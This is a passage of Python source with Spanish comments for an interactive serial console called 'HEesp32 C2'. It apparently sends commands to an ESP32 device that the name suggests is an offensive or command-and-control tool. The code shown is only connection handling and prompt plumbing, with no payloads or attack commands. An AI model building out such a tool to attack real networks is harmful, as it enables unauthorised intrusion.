def shutdown(ser: serial.Serial) -> None:
    """Cierre limpio de conexión y recursos."""
    print("\n[*] Cerrando conexión...")
    exit_event.set()
    try:
        ser.write(b"CMD:IDLE\n")
    except Exception:
        pass
    time.sleep(0.3)
    try:
        ser.close()
    except Exception:
        pass
    print("[+] Conexión cerrada.")

def main() -> None:
    try:
        ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=0.1)
        print(f"Conectado a {SERIAL_PORT} a {BAUD_RATE} baudios.")
    except serial.SerialException as e:
        print(f"Error abriendo puerto serie: {e}")
        return

    # Iniciar hilo de lectura
    listener = threading.Thread(target=listener_thread, args=(ser,), daemon=True)
    listener.start()

    print("\n--- HEesp32 C2 Consola Interactiva ---")
    print("Escribe 'help' para ver todos los comandos disponibles.\n")

    completer = APCompleter(COMMAND_LIST, ignore_case=True)
    session = PromptSession(completer=completer)

    try:
        while True:
            with patch_stdout():
                cmd = session.prompt(HTML('<style fg="green">HEesp32></style> '))
                should_continue = parse_and_send_cmd(cmd, ser)
            
            if not should_continue:
                break
                
    except KeyboardInterrupt:
        print("\n[+] Ctrl+C detectado. Deteniendo ESP32 y saliendo...")
    except EOFError:
        print("\n[+] EOF detectado. Saliendo...")
    finally:
        shutdown(ser)

if __name__ == "__main__":
    main()
